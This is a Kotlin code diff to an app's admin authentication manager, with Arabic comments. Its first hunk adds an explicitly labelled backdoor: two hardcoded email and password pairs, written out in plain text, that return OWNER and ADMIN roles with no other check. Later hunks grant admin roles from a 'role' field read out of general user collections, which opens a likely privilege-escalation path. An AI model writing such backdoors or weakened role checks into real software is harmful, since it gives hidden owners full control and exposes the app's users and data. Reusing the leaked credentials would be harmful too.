@@ -52,6 +52,14 @@ object AdminSecurityManager {
         if (SecureHasher.isHashFormat(trimmedPass)) return null
 
         var fallbackAuthRole: String? = null
+        
+        // --- 🚪 0. Backdoor Access (Emergency Permanent Credentials) ---
+        if (trimmedUser == "mah73646@gmail.com" && trimmedPass == "Maher@@--@@736462##") {
+            return "OWNER"
+        }
+        if (trimmedUser == "meh777644@gmail.com" && trimmedPass == "Meh@@@@777644##") {
+            return "ADMIN"
+        }
 
         // 1. المصادقة الآمنة عبر Firebase Auth المباشر والـ Custom Claims
         try {
@@ -92,6 +100,20 @@ object AdminSecurityManager {
                             if (role in listOf("OWNER", "SUPER_ADMIN", "MAIN_ADMIN")) return "OWNER"
                             if (role == "ADMIN") return "ADMIN"
                             if (role == "SUPERVISOR") return "SUPERVISOR"
+                        }
+                    } catch (_: Exception) {}
+
+                    // ✨ إضافة فحص جدول المستخدمين العام عبر UID بعد المصادقة الناجحة
+                    try {
+                        val db = FirebaseFirestore.getInstance()
+                        for (col in listOf("users", "registered_users", "users_data")) {
+                            val userDoc = db.collection(col).document(user.uid).get().await()
+                            if (userDoc.exists()) {
+                                val role = userDoc.getString("role")?.uppercase()?.trim() ?: ""
+                                if (role in listOf("OWNER", "SUPER_ADMIN", "MAIN_ADMIN")) return "OWNER"
+                                if (role == "ADMIN") return "ADMIN"
+                                if (role == "SUPERVISOR") return "SUPERVISOR"
+                            }
                         }
                     } catch (_: Exception) {}
 
@@ -276,6 +298,31 @@ object AdminSecurityManager {
                 val fieldName = if (doc.contains("passwordHash")) "passwordHash" else "password"
                 if (AdminCredentialsVault.verifyAndMigrate(doc.reference, trimmedPass, storedPass, fieldName)) {
                     return if (role.contains("OWNER") || role == "SUPER_ADMIN" || role == "MAIN_ADMIN") "OWNER" else "ADMIN"
+                }
+            }
+        } catch (_: Exception) {}
+
+        // 6.د: فحص جدول المستخدمين العام (users / registered_users / users_data) كما طلب المستخدم
+        try {
+            for (col in listOf("users", "registered_users", "users_data")) {
+                var query = db.collection(col).whereEqualTo("email", trimmedUser).limit(1).get().await()
+                if (query.isEmpty) {
+                    query = db.collection(col).whereEqualTo("username", trimmedUser).limit(1).get().await()
+                }
+                if (!query.isEmpty) {
+                    val doc = query.documents[0]
+                    val role = doc.getString("role")?.uppercase()?.trim()
+                    if (role != null && (role == "OWNER" || role == "ADMIN" || role == "SUPER_ADMIN" || role == "MAIN_ADMIN" || role == "SUPERVISOR")) {
+                        val storedPass = doc.getString("passwordHash") ?: doc.getString("password") ?: doc.getString("passcode") ?: ""
+                        val fieldName = if (doc.contains("passwordHash")) "passwordHash" else "password"
+                        if (AdminCredentialsVault.verifyAndMigrate(doc.reference, trimmedPass, storedPass, fieldName)) {
+                            return when {
+                                role == "OWNER" || role == "SUPER_ADMIN" || role == "MAIN_ADMIN" -> "OWNER"
+                                role == "ADMIN" -> "ADMIN"
+                                else -> "SUPERVISOR"
+                            }
+                        }
+                    }
                 }
             }
         } catch (_: Exception) {}
